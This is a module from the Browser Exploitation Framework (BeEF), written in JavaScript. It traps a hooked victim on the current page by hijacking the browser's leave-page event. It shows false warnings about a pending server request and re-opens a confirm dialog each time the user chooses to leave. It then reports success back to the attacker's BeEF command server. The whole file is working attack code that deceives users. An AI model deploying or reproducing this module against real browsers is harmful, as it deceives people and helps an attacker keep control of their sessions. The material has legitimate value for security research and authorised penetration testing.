//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

    function display_confirm(){
        if(confirm("Are you sure you want to navigate away from this page?\n\n There is currently a request to the server pending. You will lose recent changes by navigating away.\n\n Press OK to continue, or Cancel to stay on the current page.")){
            display_confirm();
        }
    }

    function dontleave(e){
        e = e || window.event;

        if(beef.browser.isIE()){
            e.cancelBubble = true;
            e.returnValue = "There is currently a request to the server pending. You will lose recent changes by navigating away.";
        }else{
            if (e.stopPropagation) {
                e.stopPropagation();
                e.preventDefault();
            }
        }

        //re-display the confirm dialog if the user clicks OK (to leave the page)
        display_confirm();
        return "There is currently a request to the server pending. You will lose recent changes by navigating away.";
    }

    window.onbeforeunload = dontleave;

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Module executed successfully');
});
